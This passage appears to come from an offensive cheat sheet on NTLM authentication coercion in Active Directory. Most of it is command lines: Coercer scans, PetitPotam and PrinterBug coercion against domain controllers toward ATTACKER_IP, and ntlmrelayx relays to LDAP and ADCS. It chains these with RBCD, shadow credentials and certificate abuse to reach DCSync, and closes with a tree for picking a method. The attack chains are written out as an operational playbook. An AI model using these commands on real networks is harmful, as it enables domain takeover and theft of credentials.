| Function | Notes |
|---|---|
| `IsPathShadowCopied` | Primary function |
| `IsPathSupported` | Alternative function |
| `GetShareMapping` | Another variant |

---

## 6. COERCER — AUTOMATED DISCOVERY TOOL

[Coercer](https://github.com/p0dalirius/Coercer) automates testing all known coercion methods.

```bash
# Scan for available coercion methods on target
coercer scan -u user -p password -d domain.com -t TARGET_IP

# Coerce using all available methods
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP

# Specific method
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP \
  --filter-method-name EfsRpcOpenFileRaw

# Unauthenticated scan
coercer scan -t TARGET_IP

# Filter by protocol
coercer coerce -u user -p password -d domain.com -t TARGET_IP -l LISTENER_IP \
  --filter-protocol-name MS-EFSR
```

### Coercer Output Interpretation

```
[+] MS-EFSR - EfsRpcOpenFileRaw      → Listening? Check relay!
[+] MS-RPRN - RpcRemoteFindFirst...   → Spooler running, exploitable
[-] MS-FSRVP - IsPathShadowCopied    → Service not running
[-] MS-DFSNM - NetrDfsRemoveStdRoot  → Access denied (non-DC?)
```

---

## 7. COERCION + RELAY ATTACK COMBINATIONS

### Combo 1: PetitPotam + LDAP Relay → RBCD

```bash
# Terminal 1: Start relay
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Terminal 2: Coerce DC01
PetitPotam.py ATTACKER_IP DC01_IP

# Result: RBCD set on DC01$ → impersonate admin to DC01
getST.py -spn cifs/DC01.domain.com -impersonate administrator DOMAIN/'EVIL$':'pass'
```

### Combo 2: PrinterBug + Unconstrained Delegation

```bash
# On compromised host with unconstrained delegation:
Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$

# Trigger from anywhere:
printerbug.py DOMAIN/user:pass@DC01 UNCONSTRAINED_HOST

# Capture DC01$ TGT → DCSync
```

### Combo 3: PetitPotam + ADCS Relay (ESC8)

```bash
# Terminal 1: Relay to ADCS
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2: Coerce DC
PetitPotam.py ATTACKER_IP DC01_IP

# Result: Certificate for DC01$ → authenticate → DCSync
certipy auth -pfx dc01.pfx -dc-ip DC02_IP
```

### Combo 4: mitm6 + LDAP Relay → Shadow Credentials

```bash
# Terminal 1: mitm6 DNS takeover
mitm6 -d domain.com

# Terminal 2: Relay to LDAP with shadow credentials
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --shadow-credentials -smb2support

# Result: Shadow credential added on victim machine → PKINIT auth
```

### Combo 5: WebDAV Coercion + LDAP Relay (Bypass SMB Signing)

```bash
# Terminal 1: Start relay
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Terminal 2: Coerce via WebDAV (HTTP-based, no SMB signing issue)
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
# Workstation's WebClient service sends HTTP-based NTLM → clean relay
```

---

## 8. COERCION METHOD SELECTION TREE

```
Need to coerce authentication
│
├── Target is a Domain Controller?
│   ├── PetitPotam (unauthenticated if unpatched)
│   ├── PetitPotam (authenticated — most reliable)
│   ├── DFSCoerce (if DFS role installed)
│   └── PrinterBug (if Spooler running — rare on modern DCs)
│
├── Target is a file server?
│   ├── ShadowCoerce (if FSRVP agent running)
│   ├── PetitPotam (authenticated)
│   └── PrinterBug (if Spooler running)
│
├── Target is a workstation?
│   ├── PrinterBug (Spooler usually running)
│   ├── PetitPotam (authenticated)
│   └── WebDAV coercion (if WebClient running — HTTP-based!)
│
├── No creds available?
│   ├── PetitPotam unauthenticated (unpatched systems only)
│   ├── Responder poisoning (passive capture)
│   └── mitm6 (DHCPv6 DNS takeover)
│
├── Need HTTP-based NTLM (bypass SMB signing)?
│   ├── WebDAV coercion from workstation
│   └── mitm6 WPAD trigger
│
└── Not sure what works?
    └── Use Coercer tool: coercer scan -t TARGET
```
